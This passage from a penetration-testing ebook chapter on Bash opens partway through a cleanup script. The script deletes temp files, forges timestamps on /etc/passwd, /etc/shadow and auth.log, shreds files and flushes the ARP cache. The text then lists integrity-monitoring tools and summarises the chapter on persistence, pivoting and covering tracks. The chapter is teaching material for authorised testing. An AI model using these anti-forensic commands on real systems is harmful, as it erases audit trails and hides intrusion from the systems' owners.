find /tmp /var/tmp -user "$(whoami)" -name "*$identifier*" -type f -delete
# Modify timestamps
touch -r /etc/hosts /etc/passwd /etc/shadow /var/log/auth.log
# Securely remove sensitive files
shred -u -z -n 3 /tmp/sensitive_data.txt
# Flush ARP cache
sudo ip -s -s neigh flush all
echo "Cleanup completed"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.968.1">
     This script performs
    </span>
    <a id="_idIndexMarker797">
    </a>
    <span class="koboSpan" id="kobo.969.1">
     the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.970.1">
      following actions:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.971.1">
      Clears the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.972.1">
       Bash history
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.973.1">
      Clears common
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.974.1">
       log files
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.975.1">
      Removes temporary files that were created during
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.976.1">
       the assessment
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.977.1">
      Modifies the timestamps of important
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.978.1">
       system files
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.979.1">
      Securely removes a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.980.1">
       sensitive file
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.981.1">
      Flushes the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.982.1">
       ARP cache
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.983.1">
     Remember, the effectiveness of these cleanup methods can vary depending on the system configuration and monitoring tools
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.984.1">
      in place.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.985.1">
     Proper cleanup also relies on keeping detailed notes of your activities and knowing your tools.
    </span>
    <span class="koboSpan" id="kobo.985.2">
     Use of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.986.1">
      script
     </span>
    </strong>
    <span class="koboSpan" id="kobo.987.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.988.1">
      tee
     </span>
    </strong>
    <span class="koboSpan" id="kobo.989.1">
     commands to save a log file of your activities is also helpful and can save the day when you eventually forget to take screenshots for the pentest report.
    </span>
    <span class="koboSpan" id="kobo.989.2">
     Always be aware of the indicators of compromise that are left behind by your pentest tools.
    </span>
    <span class="koboSpan" id="kobo.989.3">
     There are Windows and Linux tools that snapshot and compare before and after running exploits.
    </span>
    <span class="koboSpan" id="kobo.989.4">
     This will enable you to properly vet new tools in an offline lab environment to ensure they’re trustworthy, as well as provide a snapshot of system changes you can expect
    </span>
    <a id="_idIndexMarker798">
    </a>
    <span class="koboSpan" id="kobo.990.1">
     from your tools
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.991.1">
      and exploits.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.992.1">
     The following are a select few Linux
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.993.1">
      snapshot tools:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.994.1">
       diff
      </span>
     </strong>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.995.1">
        and cmp
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.996.1">
       :
      </span>
     </span>
     <ul>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.997.1">
         diff
        </span>
       </strong>
       <span class="koboSpan" id="kobo.998.1">
        : A
       </span>
       <a id="_idIndexMarker799">
       </a>
       <span class="koboSpan" id="kobo.999.1">
        command-line tool that compares files line by line and outputs the
       </span>
       <a id="_idIndexMarker800">
       </a>
       <span class="koboSpan" id="kobo.1000.1">
        differences.
       </span>
       <span class="koboSpan" id="kobo.1000.2">
        It can be used to compare configuration files, logs, or other text-based files before and after running
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.1001.1">
         an exploit.
        </span>
       </span>
      </li>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.1002.1">
         cmp
        </span>
       </strong>
       <span class="koboSpan" id="kobo.1003.1">
        : Another
       </span>
       <a id="_idIndexMarker801">
       </a>
       <span class="koboSpan" id="kobo.1004.1">
        command-line tool that compares two files
       </span>
       <a id="_idIndexMarker802">
       </a>
       <span class="koboSpan" id="kobo.1005.1">
        byte by byte and is useful for binary
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.1006.1">
         file comparison.
        </span>
       </span>
      </li>
     </ul>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1007.1">
       Tripwire
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1008.1">
      : A popular integrity monitoring tool that can be used to create a baseline of the
     </span>
     <a id="_idIndexMarker803">
     </a>
     <span class="koboSpan" id="kobo.1009.1">
      filesystem and compare it against the system’s
     </span>
     <a id="_idIndexMarker804">
     </a>
     <span class="koboSpan" id="kobo.1010.1">
      state after an exploit.
     </span>
     <span class="koboSpan" id="kobo.1010.2">
      It can alert you to changes in files, directories,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1011.1">
       and configurations.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1012.1">
       Advanced Intrusion Detection Environment (AIDE)
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1013.1">
      : AIDE creates a database of system
     </span>
     <a id="_idIndexMarker805">
     </a>
     <span class="koboSpan" id="kobo.1014.1">
      files’ checksums, and
     </span>
     <a id="_idIndexMarker806">
     </a>
     <span class="koboSpan" id="kobo.1015.1">
      it can be used to compare the system’s state before and after running an exploit to detect changes in files
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1016.1">
       and directories.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1017.1">
       Linux Auditing System (Auditd)
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1018.1">
      : Auditd
     </span>
     <a id="_idIndexMarker807">
     </a>
     <span class="koboSpan" id="kobo.1019.1">
      allows you to monitor and log system calls and can be configured to track changes to files, directories, or even certain types of system activity.
     </span>
     <span class="koboSpan" id="kobo.1019.2">
      Comparing
     </span>
     <a id="_idIndexMarker808">
     </a>
     <span class="koboSpan" id="kobo.1020.1">
      audit logs before and after running an exploit can help
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1021.1">
       identify changes.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1022.1">
       OSSEC
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1023.1">
      : An
     </span>
     <a id="_idIndexMarker809">
     </a>
     <span class="koboSpan" id="kobo.1024.1">
      open-source
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1025.1">
       host-based intrusion detection system
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1026.1">
      (
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1027.1">
       HIDS
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1028.1">
      ) that can monitor system
     </span>
     <a id="_idIndexMarker810">
     </a>
     <span class="koboSpan" id="kobo.1029.1">
      files, registry keys, and
     </span>
     <a id="_idIndexMarker811">
     </a>
     <span class="koboSpan" id="kobo.1030.1">
      other critical areas for changes.
     </span>
     <span class="koboSpan" id="kobo.1030.2">
      It can be configured to alert you to modifications caused by
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1031.1">
       an exploit.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.1032.1">
     The following workflow will provide a snapshot of the changes that have been caused by a tool
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1033.1">
      or exploit:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1034.1">
       Create a baseline snapshot
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1035.1">
      : Use the selected tool to take a snapshot of the system before running the exploit.
     </span>
     <span class="koboSpan" id="kobo.1035.2">
      This snapshot will serve as the
     </span>
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.1036.1">
        before
       </span>
      </em>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1037.1">
       state.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1038.1">
       Execute the exploit
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1039.1">
      : Execute the exploit you’re testing on
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1040.1">
       the system.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1041.1">
       Create a post-exploit snapshot
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1042.1">
      : Use the same tool to take a snapshot of the system after running
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1043.1">
       the exploit.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1044.1">
       Compare the snapshots
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1045.1">
      : Use the comparison features of the tools to analyze the differences between the before and after snapshots, identifying any changes made by the exploit.
     </span>
     <span class="koboSpan" id="kobo.1045.2">
      This will help you log and analyze the impact of the exploit on
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1046.1">
       the system.
      </span>
     </span>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1047.1">
     This section provided a comprehensive primer on cleaning up after yourself and covering tracks.
    </span>
    <span class="koboSpan" id="kobo.1047.2">
     Two good rules to operate by are to do no harm and clean up after yourself.
    </span>
    <span class="koboSpan" id="kobo.1047.3">
     Always follow the Statement of Work and Rules of Engagement documents, and communicate with any points of contact or system owners when
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1048.1">
      in doubt.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-202">
    <a id="_idTextAnchor433">
    </a>
    <span class="koboSpan" id="kobo.1049.1">
     Summary
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.1050.1">
     This chapter explored the essential techniques of maintaining persistence and executing pivoting operations during pentesting, with a focus on utilizing the Bash shell.
    </span>
    <span class="koboSpan" id="kobo.1050.2">
     We began by examining the fundamentals of persistence, including methods to establish long-term access to compromised systems through cron jobs, startup scripts, and system service manipulation.
    </span>
    <span class="koboSpan" id="kobo.1050.3">
     The chapter then progressed to more sophisticated persistence techniques, providing pentesters with a comprehensive toolkit for ensuring
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1051.1">
      continued access.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1052.1">
     The latter half of this chapter shifted focus to network pivoting, starting with basic concepts and moving on to advanced strategies.
    </span>
    <span class="koboSpan" id="kobo.1052.2">
     Here, we covered how to implement port forwarding and tunneling mechanisms using SSH and other tools.
    </span>
    <span class="koboSpan" id="kobo.1052.3">
     This chapter concluded with a section on cleanup procedures, detailing methods you can use to erase command histories, manage logs, and minimize any digital footprints that are left during the testing process.
    </span>
    <span class="koboSpan" id="kobo.1052.4">
     Throughout this chapter, practical Bash scripts and commands were provided, accompanied by clear explanations to ensure you can apply these techniques in real-world
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1053.1">
      scenarios effectively.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1054.1">
     In the next chapter, we’ll explore pentest reporting using Bash scripting and tools we can use to process data from tool output and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1055.1">
      formulate reports.
     </span>
    </span>
   </p>
  </div>
 </body></html>